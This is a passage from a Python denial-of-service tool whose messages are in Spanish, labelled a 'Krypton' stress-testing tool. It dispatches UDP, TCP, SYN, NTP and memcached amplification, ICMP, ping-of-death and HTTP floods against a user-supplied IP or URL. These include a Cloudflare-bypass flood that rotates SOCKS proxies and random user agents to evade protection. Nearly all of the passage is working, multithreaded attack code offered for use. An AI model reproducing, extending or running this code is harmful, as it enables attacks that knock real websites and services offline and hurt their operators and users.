                s.send(str.encode(req))
            s.close()
        except Exception as e:
            try:
                s.close()
            except:
                pass
    print(f"[HTTPSPOOF] Ataque contra {url} finalizado.")

def run_cloudflare_bypass(target, duration, threads):
    try:
        attacker = CloudflareBypass(target_url=target, threads=threads, duration=duration)
        attacker.start()
    except Exception as e:
        print(f"[!] Error ejecutando ataque CFBSSL: {e}")

def CFB(url, port, secs):
    target_url = f"{url}:{port}" if port else url
    print(f"[HTTPCFB] Iniciando ataque contra {target_url} por {secs} segundos")
    end_time = time.time() + secs
    proxies = proxy_manager.proxies
    proxy_list = [f"{ptype}://{addr}" for ptype, addr in proxies] if proxies else None
    scraper = cloudscraper.create_scraper()
    while time.time() < end_time:
        try:
            headers = {'User-Agent': generate_user_agent()}
            if proxy_list:
                proxy = random.choice(proxy_list)
                scraper.proxies = {'http': proxy, 'https': proxy}
            scraper.get(target_url, headers=headers, timeout=15)
            scraper.head(target_url, headers=headers, timeout=15)
        except Exception as e:
            print(f"[HTTPCFB] Error: {e}")
    print(f"[HTTPCFB] Ataque contra {target_url} finalizado.")

# --- Optimized Main Section ---

ATTACK_METHODS = {
    '.UDP': {'func': attack_udp, 'args': ['target', 'port', 'secs', 'size']},
    '.TCP': {'func': attack_tcp, 'args': ['target', 'port', 'secs', 'size']},
    '.TUP': {'func': attack_tup, 'args': ['target', 'port', 'secs', 'size']},
    '.SYN': {'func': attack_SYN, 'args': ['target', 'port', 'secs']},
    '.HEX': {'func': attack_hex, 'args': ['target', 'port', 'secs']},
    '.ROBLOX': {'func': attack_roblox, 'args': ['target', 'port', 'secs', 'size']},
    '.JUNK': {'func': attack_junk, 'args': ['target', 'port', 'secs']},
    '.VSE': {'func': attack_vse, 'args': ['target', 'port', 'secs']},
    '.NTP': {'func': NTP, 'args': ['target', 'port', 'secs']}, 
    '.MEM': {'func': MEM, 'args': ['target', 'port', 'secs']}, 
    '.ICMP': {'func': icmp_flood, 'args': ['target', 'secs']}, 
    '.POD': {'func': pod, 'args': ['target', 'secs']}, 
    '.HTTPGET': {'func': GET_attack, 'args': ['target', 'port', 'secs']},
    '.HTTPSTORM': {'func': STORM_attack, 'args': ['target', 'port', 'secs']},
    '.HTTPCFB': {'func': CFB, 'args': ['target', 'port', 'secs']},
    '.HTTPIO': {'func': httpio, 'args': ['target', 'secs', 'threads', 'attack_type']}, 
    '.HTTPSPOOF': {'func': httpSpoofAttack, 'args': ['target', 'secs']},
    '.CFBSSL': {'func': run_cloudflare_bypass, 'args': ['target', 'secs', 'threads']},

}

def validate_target(method: str, target: str, port: int) -> bool:
    """Validates the target IP/URL and port based on the attack method."""
    if method in ['.UDP', '.TCP', '.TUP', '.SYN', '.HEX', '.ROBLOX', '.JUNK', '.VSE', '.NTP', '.MEM', '.ICMP', '.POD']:
        if not validate_ip(target):
            print("Error: IP inválida.")
            return False
        if method in ['.NTP', '.MEM', '.UDP', '.TCP', '.TUP', '.SYN', '.HEX', '.ROBLOX', '.VSE'] and port != 0 and not validate_port(port):
             print("Error: Puerto inválido.")
             return False
    elif method.startswith('.HTTP'):
        if not (target.startswith('http://') or target.startswith('https://')):
            target = 'http://' + target 
        try:
            result = urlparse(target)
            if not all([result.scheme, result.netloc]):
                raise ValueError
        except ValueError:
            print("Error: URL inválida.")
            return False
        if port and not validate_port(port):
            print("Error: Puerto inválido.")
            return False
    return True

def launch_attack(method_info: dict, parsed_args: argparse.Namespace, threads: int):
    """Launches the attack using threading."""
    attack_func = method_info['func']
    required_args = method_info['args']

    func_args = {}
    if 'target' in required_args:
        func_args['target'] = parsed_args.target
    if 'port' in required_args:
        func_args['port'] = parsed_args.port
    if 'secs' in required_args or 'timer' in required_args or 'times' in required_args: 
        func_args['secs'] = parsed_args.time 
    if 'size' in required_args:
        func_args['size'] = parsed_args.size
    if 'threads' in required_args:
        func_args['threads'] = threads
    if 'attack_type' in required_args:
        func_args['attack_type'] = "NORMAL" 

    proxy_methods = ['.HTTPCFB', '.HTTPSPOOF']
    if parsed_args.method.upper() in proxy_methods:
         print(f"[MAIN] Inicializando proxies automáticamente para método: {parsed_args.method.upper()}")
       
         local_proxy_manager = ProxyManager()
         try:
            
             local_proxy_manager.load_proxies("socks4_proxies.txt") 
             if not local_proxy_manager.proxies:
              
                 asyncio.run(initialize_proxies("socks4", local_proxy_manager)) 
             # Make proxies available where needed (e.g., modify global var or pass to function)
             # For simplicity, assuming functions like CFB, httpSpoofAttack access the global proxy_manager
             # If they need the local one, you'd need to refactor them to accept it as an argument
             global proxy_manager # Or refactor functions to take it
             proxy_manager = local_proxy_manager
         except Exception as e:
             print(f"[MAIN] Error inicializando proxies: {e}")
             # Decide whether to proceed without proxies or abort
             # For now, let the attack function handle lack of proxies
             # return # Uncomment to abort if proxy init fails for proxy methods


    threads_list = []
    try:
        for i in range(threads):
           
            thread = threading.Thread(target=attack_func, kwargs=func_args, daemon=True)
            threads_list.append(thread)
            thread.start()

        print(f"Ataque {parsed_args.method.upper()} iniciado contra {parsed_args.target}:{parsed_args.port} por {parsed_args.time} segundos con {threads} hilos.")

        
        for thread in threads_list:
        
            thread.join(timeout=parsed_args.time + 5)

        print("Ataque finalizado.")
    except KeyboardInterrupt:
        print("\nAtaque interrumpido por el usuario.")
      
    except Exception as e:
        print(f"Error al ejecutar el ataque: {e}")

def main():
    parser = argparse.ArgumentParser(description="Herramienta de pruebas de estrés Krypton")
    parser.add_argument("method", help="Método de ataque (ej: .UDP, .TCP, .NTP, .HTTPGET, .HTTPCFB, etc.)")
    parser.add_argument("target", help="IP o URL objetivo")
    parser.add_argument("port", nargs='?', type=int, default=80, help="Puerto objetivo (opcional, por defecto 80)")
    parser.add_argument("time", type=int, help="Duración del ataque en segundos")
    parser.add_argument("size", nargs='?', type=int, default=1024, help="Tamaño del paquete (opcional, por defecto 1024)")
    parser.add_argument("threads", nargs='?', type=int, default=10, help="Número de hilos (opcional, por defecto 10)")

    args = parser.parse_args()

    method = args.method.upper()
    secs = args.time
    threads = args.threads

    if not validate_time(secs):
        print("Error: Duración inválida (10-86400 segundos).")
        return

    if not validate_target(method, args.target, args.port):
        return 
    if method in ['.UDP', '.TCP', '.TUP', '.ROBLOX'] and not (1 <= args.size <= 65500):
         print("Error: Tamaño de paquete inválido (1-65500 bytes).")
         return

    method_info = ATTACK_METHODS.get(method)
    if not method_info:
        print(f"Error: Método '{method}' no reconocido.")
        return

    launch_attack(method_info, args, threads)


if __name__ == '__main__':
    init(autoreset=True) 
    main()
